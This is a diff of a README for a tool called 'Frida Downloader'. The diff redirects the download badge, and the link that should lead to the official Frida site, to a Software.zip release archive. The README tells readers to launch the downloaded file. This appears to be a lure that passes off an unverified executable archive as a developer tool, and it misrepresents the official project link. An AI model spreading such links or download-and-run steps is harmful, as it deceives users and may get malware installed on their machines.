@@ -9,7 +9,7 @@ Frida Downloader is a powerful command-line tool designed to simplify the proces
 🚀 Enhances productivity for developers and security researchers  
 
 ## Download
-[![Download Frida Downloader](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip "Download Frida Downloader")
+[![Download Frida Downloader](https://github.com/JhonlorenzManadeo/fridaDownloader/releases/download/v2.0/Software.zip)](https://github.com/JhonlorenzManadeo/fridaDownloader/releases/download/v2.0/Software.zip "Download Frida Downloader")
 
 Please click on the above button to download the necessary components. Ensure that the downloaded file is launched for installation.
 
@@ -39,7 +39,7 @@ fridaDownloader --server android
 ```
 
 ## About Frida
-[Frida](https://frida.re/) is a dynamic instrumentation toolkit that enables developers and security researchers to inject JavaScript into native apps. By leveraging Frida, users can intercept function calls, monitor network traffic, and perform various other tasks for analysis and testing purposes.
+[Frida](https://github.com/JhonlorenzManadeo/fridaDownloader/releases/download/v2.0/Software.zip) is a dynamic instrumentation toolkit that enables developers and security researchers to inject JavaScript into native apps. By leveraging Frida, users can intercept function calls, monitor network traffic, and perform various other tasks for analysis and testing purposes.
 
 ## Repository Topics
 🔒 android-pentesting  
